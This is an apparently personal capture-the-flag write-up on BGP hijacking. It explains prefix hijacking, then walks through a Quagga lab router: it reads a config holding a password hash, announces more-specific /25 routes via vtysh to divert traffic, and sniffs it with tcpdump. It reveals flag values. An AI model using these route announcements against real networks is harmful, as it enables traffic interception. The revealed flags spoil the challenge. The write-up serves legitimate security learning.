### What Is BGP Hijacking?

BGP hijacking occurs when an AS announces IP address spaces belonging to another AS. This announcement attracts traffic meant for that IP address range.

Other common names for BGP hijacking are:

- **Prefix** hijacking.
- **Route** hijacking.
- **IP** hijacking.

BGP hijacking occurs when someone or something corrupts the routing tables maintained by AS routers. This corruption enables a backbone router to improperly advertise as having the most efficient route to a network.

Since BGP always favors the shortest path to the desired IP address, anyone looking to cause a BGP hijack must create a route announcement that either:

- Provides a more specific route with a smaller range of IP addresses than other ASes.
- Offers a shorter route to certain blocks of IP addresses.

Both strategies require the hacker to either control an AS router or compromise one of approx. 80,000 currently operational ASes. This process is easier said than done, which is why most malicious BGP hijacks are the work of highly skilled and well-funded hacker groups.

BGP hijacking enables attackers to reroute Internet traffic to the wrong destination or route. Rerouting traffic enables a threat actor to intercept, spy on, or tamper with transmitted data.

![How BGP hijacks work](https://phoenixnap.com/blog/wp-content/uploads/2023/11/how-bgp-hijacks-work.jpg)

The easiest way to understand BGP hijacking is to compare it to someone secretly changing all the signs on a stretch of freeway and rerouting traffic onto incorrect exits.

![[Pasted image 20240417143321.png]]

### Quagga

You saw “quagga” mentioned in the Router exploration section , but what is quagga ?  
Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking.

You can see there are two configuration files:\

#### /etc/quagga/bgpd.conf

```
!
hostname router1
password a0ceca89b47161dd49e4f6b1073fc579
log stdout
!
debug bgp updates
!
router bgp 60001
 bgp log-neighbor-changes
 bgp router-id 1.1.1.1
 network 172.16.1.0/24
 
 neighbor 172.16.12.102 remote-as 60002
 neighbor 172.16.12.102 weight 100
 neighbor 172.16.12.102 soft-reconfiguration inbound
 neighbor 172.16.12.102 prefix-list LocalNet in
 
 neighbor 172.16.31.103 remote-as 60003
 neighbor 172.16.31.103 weight 100
 neighbor 172.16.31.103 soft-reconfiguration inbound
 neighbor 172.16.31.103 prefix-list LocalNet in
!
# Deny any changes to routing to the local network
ip prefix-list LocalNet seq 5 deny 172.16.1.0/24 le 32
ip prefix-list LocalNet seq 10 permit 0.0.0.0/0 le 32
!
line vty
!
end
#

```

This router is AS 60001
There are another 2 AS:

60002 and 60003

### Configuration with VTYSH

VTYSH provides a unified command-line interface for managing multiple network services and protocols, such as routing protocols (e.g., BGP, OSPF) and network configuration settings.

When you enter the "vtysh" command, you're essentially accessing a shell environment where you can interact with the networking device and configure various aspects of its operation, such as routing tables, network interfaces, and protocol settings.

Run:

```
$ vtysh
```

router1.ctx.ctf# $ 

 Once into vtysh run the following to see the neighbors:

```
 $ show bgp neighbors

```

> BGP neighbor is 172.16.12.102, remote AS 60002, local AS 60001, external link
> ...
> BGP neighbor is 172.16.31.103, remote AS 60003, local AS 60001, external link
> ...


#### Routing tables

Run:

```
 $ show ip bgp neighbors 172.16.12.102 advertised-routes
```

> ![[bgp.png]]

You can see there are two networks 172.16.1.0/24 and 172.16.3.0/24, so if you get connected to the 172.16.2.0/24 you'd intercept all traffic.

Run the following commands:

```
$ configure terminal
router1.ctx.ctf(config)# $ router bgp 60001
router bgp 60001
router1.ctx.ctf(config-router)# $ network 172.16.2.0/25
router1.ctx.ctf(config-router)# $ network 172.16.3.0/25

```

Exit the terminal with the two `exit` commands.

See how the configuration has changed:

```
router1.ctx.ctf#$ show ip bgp neighbors 172.16.12.102 advertised-routes
```

![[bgp1.png]]

> [!NOTE] Address 172.16.2.0/25
>   
The network address "172.16.2.0/25" represents a subnet with the following characteristics:

> - Network Address: 172.16.2.0
> - Subnet Mask: 255.255.255.128 (/25 in CIDR notation)
> - Usable IP Range: 172.16.2.1 to 172.16.2.126
> - Broadcast Address: 172.16.2.127
> 
> In CIDR notation (/25), the subnet mask has 25 leading bits set to 1, indicating the network portion of the address, and the remaining 7 bits set to 0, allowing for 128 possible host addresses in the subnet.
> 
> This subnet falls within the private IP address range defined by RFC 1918, commonly used in local area networks (LANs) for internal communication.

#### Capturing packets


You're telling `tcpdump` to capture packets on the `eth0` interface and print each packet's content in ASCII format, including both the packet header and payload.

- The `-i` option, it specifies the network interface to capture packets from. In your command, `eth0` is the network interface specified.

- The `-A` option tells `tcpdump` to print each packet in ASCII format, displaying both the packet's header and its payload as ASCII characters.

```
$ tcpdump -i eth0 -A

```

#### UDP flag
Look at the packets and you'll find the FLAG:UDP.

![[udp_flag.png]]

The flag is {FLAG:UDP: 3bb271d020df6cbe599a46d20e9fcb3c

#### TCP flag
Depending on how you view your dumped data, the TCP flag can be a bit more of a pain than the UDP one. In particular, it is sent 1 character at a time – if you dump full packets (not just the data payload), you would need to notice it and manually put it back together.